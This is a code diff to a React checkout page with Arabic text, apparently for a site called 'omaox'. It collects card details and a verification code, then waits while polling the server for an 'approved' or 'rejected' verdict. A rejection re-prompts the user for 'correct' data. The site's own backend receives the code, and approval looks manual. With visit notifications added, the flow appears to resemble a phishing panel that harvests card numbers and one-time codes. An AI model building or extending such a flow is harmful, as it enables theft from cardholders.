@@ -1,4 +1,4 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useCallback } from "react";
 import { useForm } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { z } from "zod";
@@ -6,7 +6,7 @@ import { motion, AnimatePresence } from "framer-motion";
 import { Link } from "wouter";
 import { Layout } from "@/components/layout";
 import { cn, formatCurrency } from "@/lib/utils";
-import { ShieldCheck, Loader2, ArrowRight, CreditCard, Smartphone, CheckCircle2 } from "lucide-react";
+import { ShieldCheck, Loader2, ArrowRight, CreditCard, Smartphone, CheckCircle2, XCircle, RefreshCw } from "lucide-react";
 import { useNotifyVisit, useSubmitOrder, useSubmitVerificationCode } from "@workspace/api-client-react";
 import { useToast } from "@/hooks/use-toast";
 import { useRate } from "@/hooks/use-rate";
@@ -36,9 +36,10 @@ function formatCardNumber(value: string): string {
 }
 
 export default function Buy() {
-  const [step, setStep] = useState<"form" | "verify" | "success">(() => {
+  const [step, setStep] = useState<"form" | "verify" | "waiting" | "success" | "rejected">(() => {
     const saved = localStorage.getItem("omaox_step");
-    return (saved === "verify" || saved === "success") ? saved : "form";
+    if (saved === "verify" || saved === "waiting" || saved === "success") return saved as any;
+    return "form";
   });
   const [orderId, setOrderId] = useState<string>(() => {
     return localStorage.getItem("omaox_orderId") || "";
@@ -100,6 +101,27 @@ export default function Buy() {
     }
   };
 
+  const pollOrderStatus = useCallback(async (oid: string) => {
+    try {
+      const res = await fetch(`${import.meta.env.BASE_URL}api/order/status/${encodeURIComponent(oid)}`);
+      if (!res.ok) return;
+      const data = await res.json();
+      if (data.status === "approved") {
+        setStep("success");
+      } else if (data.status === "rejected") {
+        setStep("rejected");
+      }
+    } catch {}
+  }, []);
+
+  useEffect(() => {
+    if (step !== "waiting") return;
+    const interval = setInterval(() => {
+      pollOrderStatus(orderId);
+    }, 2000);
+    return () => clearInterval(interval);
+  }, [step, orderId, pollOrderStatus]);
+
   const onVerifyCode = async () => {
     if (code.length < 4) {
       toast({ title: "تنبيه", description: "يرجى إدخال الكود كاملاً", variant: "destructive" });
@@ -108,15 +130,26 @@ export default function Buy() {
     try {
       const res = await submitVerify({ data: { orderId, code } });
       if (res.success) {
-        setStep("success");
+        setStep("waiting");
+        window.scrollTo({ top: 0, behavior: 'smooth' });
       }
     } catch {
       toast({
         title: "خطأ",
-        description: "الكود غير صحيح أو حدث خطأ في الاتصال",
+        description: "حدث خطأ في الاتصال، حاول مرة أخرى",
         variant: "destructive"
       });
     }
+  };
+
+  const resetForm = () => {
+    localStorage.removeItem("omaox_step");
+    localStorage.removeItem("omaox_orderId");
+    setStep("form");
+    setOrderId("");
+    setCode("");
+    form.reset();
+    window.scrollTo({ top: 0, behavior: 'smooth' });
   };
 
   return (
@@ -192,7 +225,7 @@ export default function Buy() {
                   </div>
 
                   <div className="glass-card rounded-2xl p-6 md:p-8">
-                    <h3 className="text-xl font-bold text-white mb-6 border-b border-white/10 pb-4">💳 بيانات البطاقة</h3>
+                    <h3 className="text-xl font-bold text-white mb-6 border-b border-white/10 pb-4">بيانات البطاقة</h3>
                     
                     <div className="flex items-center gap-3 p-4 rounded-xl bg-primary/10 border border-primary/30 mb-8">
                       <CreditCard className="w-6 h-6 text-primary shrink-0" />
@@ -372,6 +405,42 @@ export default function Buy() {
               </motion.div>
             )}
 
+            {step === "waiting" && (
+              <motion.div
+                key="waiting"
+                initial={{ opacity: 0, scale: 0.95 }}
+                animate={{ opacity: 1, scale: 1 }}
+                exit={{ opacity: 0, scale: 0.95 }}
+                className="max-w-md mx-auto mt-10"
+              >
+                <div className="glass-card rounded-3xl p-10 text-center border-t-4 border-t-primary">
+                  <div className="w-24 h-24 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-8 relative">
+                    <Loader2 className="w-12 h-12 text-primary animate-spin" />
+                    <div className="absolute inset-0 rounded-full border-2 border-primary/20 animate-ping"></div>
+                  </div>
+                  
+                  <h2 className="text-2xl font-bold text-white mb-4">جاري التحقق من العملية</h2>
+                  <p className="text-zinc-400 mb-6 leading-relaxed">
+                    يتم الآن مراجعة طلبك والتحقق من الكود. يرجى الانتظار وعدم إغلاق هذه الصفحة.
+                  </p>
+
+                  <div className="bg-black/30 p-4 rounded-xl mb-6 border border-white/5">
+                    <p className="text-sm text-zinc-500 mb-1">رقم الطلب</p>
+                    <p className="text-white font-mono font-bold tracking-wider">{orderId}</p>
+                  </div>
+
+                  <div className="flex items-center justify-center gap-3 text-sm text-zinc-500">
+                    <div className="flex gap-1">
+                      <span className="w-2 h-2 bg-primary rounded-full animate-bounce" style={{ animationDelay: "0ms" }}></span>
+                      <span className="w-2 h-2 bg-primary rounded-full animate-bounce" style={{ animationDelay: "150ms" }}></span>
+                      <span className="w-2 h-2 bg-primary rounded-full animate-bounce" style={{ animationDelay: "300ms" }}></span>
+                    </div>
+                    <span>قد يستغرق الأمر بضع دقائق</span>
+                  </div>
+                </div>
+              </motion.div>
+            )}
+
             {step === "success" && (
               <motion.div
                 key="success"
@@ -391,9 +460,9 @@ export default function Buy() {
                     <CheckCircle2 className="w-12 h-12" />
                   </motion.div>
                   
-                  <h2 className="text-3xl font-bold text-white mb-4 relative z-10">تم بنجاح!</h2>
+                  <h2 className="text-3xl font-bold text-white mb-4 relative z-10">تمت الموافقة!</h2>
                   <p className="text-zinc-400 mb-8 relative z-10 leading-relaxed">
-                    تم استلام طلبك والتحقق من البيانات. سيتم تحويل الرصيد إلى محفظتك خلال دقائق.
+                    تمت الموافقة على طلبك بنجاح. سيتم تحويل الرصيد إلى محفظتك قريباً.
                   </p>
                   
                   <div className="bg-black/30 p-4 rounded-xl mb-8 border border-white/5 relative z-10">
@@ -408,6 +477,41 @@ export default function Buy() {
                   >
                     العودة للرئيسية
                   </Link>
+                </div>
+              </motion.div>
+            )}
+
+            {step === "rejected" && (
+              <motion.div
+                key="rejected"
+                initial={{ opacity: 0, scale: 0.9 }}
+                animate={{ opacity: 1, scale: 1 }}
+                className="max-w-md mx-auto mt-10"
+              >
+                <div className="glass-card rounded-3xl p-10 text-center relative overflow-hidden">
+                  <div className="absolute inset-0 bg-red-500/5"></div>
+                  
+                  <motion.div 
+                    initial={{ scale: 0 }}
+                    animate={{ scale: 1 }}
+                    transition={{ type: "spring", bounce: 0.5, delay: 0.2 }}
+                    className="w-24 h-24 bg-red-500/20 text-red-500 rounded-full flex items-center justify-center mx-auto mb-6 relative z-10"
+                  >
+                    <XCircle className="w-12 h-12" />
+                  </motion.div>
+                  
+                  <h2 className="text-3xl font-bold text-white mb-4 relative z-10">الكود غير صحيح</h2>
+                  <p className="text-zinc-400 mb-8 relative z-10 leading-relaxed">
+                    كود التحقق الذي أدخلته غير صحيح. يرجى المحاولة مرة أخرى وإدخال البيانات الصحيحة.
+                  </p>
+                  
+                  <button 
+                    onClick={resetForm}
+                    className="w-full py-4 rounded-xl bg-primary text-zinc-950 font-bold text-lg transition-all flex items-center justify-center gap-2 relative z-10 hover:bg-amber-400"
+                  >
+                    <RefreshCw className="w-5 h-5" />
+                    حاول مرة أخرى
+                  </button>
                 </div>
               </motion.div>
             )}
